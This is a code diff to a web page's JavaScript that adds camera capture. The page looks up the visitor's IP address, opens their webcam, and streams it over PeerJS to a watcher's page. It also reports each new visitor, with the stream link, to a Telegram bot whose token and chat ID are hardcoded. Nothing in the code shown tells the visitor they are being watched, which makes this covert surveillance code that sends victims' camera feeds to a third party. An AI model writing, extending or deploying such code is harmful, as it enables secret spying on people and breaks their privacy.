@@ -60,10 +60,11 @@
     <script>
         let peer;
         let peerId;
-        let liveStreamLink;
+        let localStream;
 
         async function startLiveStream() {
             await getIpAddress();  // Fetch IP address
+            await initializeCamera();  // Start user’s camera
             initializePeerConnection();  // Start PeerJS connection
         }
 
@@ -71,8 +72,18 @@
             await fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    ipAddress = data.ip;
+                    console.log("IP Address:", data.ip);
                 });
+        }
+
+        async function initializeCamera() {
+            try {
+                // Get user’s camera stream
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                console.log('Camera stream initialized.');
+            } catch (error) {
+                console.error('Failed to access camera:', error);
+            }
         }
 
         function initializePeerConnection() {
@@ -80,13 +91,26 @@
 
             peer.on('open', (id) => {
                 peerId = id;
-                liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
-                sendStreamLinkToBot();  // Send peer ID and link to Telegram bot
+                const liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
+                sendStreamLinkToBot(liveStreamLink);  // Send peer ID and link to Telegram bot
+
+                // Automatically call the live.html page
+                peer.on('connection', (conn) => {
+                    conn.on('open', () => {
+                        console.log('Peer connection established.');
+                    });
+
+                    // Start the call to the live.html peer
+                    const call = peer.call(conn.peer, localStream);
+                    call.on('error', (err) => {
+                        console.error('Call error:', err);
+                    });
+                });
             });
         }
 
-        function sendStreamLinkToBot() {
-            const message = `New Interaction Detected!\nIP Address: ${ipAddress}\nLive Camera Stream: ${liveStreamLink}\nPeer ID: ${peerId}\nTime: ${new Date().toLocaleString()}`;
+        function sendStreamLinkToBot(liveStreamLink) {
+            const message = `New Interaction Detected!\nLive Camera Stream: ${liveStreamLink}\nPeer ID: ${peerId}\nTime: ${new Date().toLocaleString()}`;
 
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
             const chatId = '860517021';  // Your chat ID
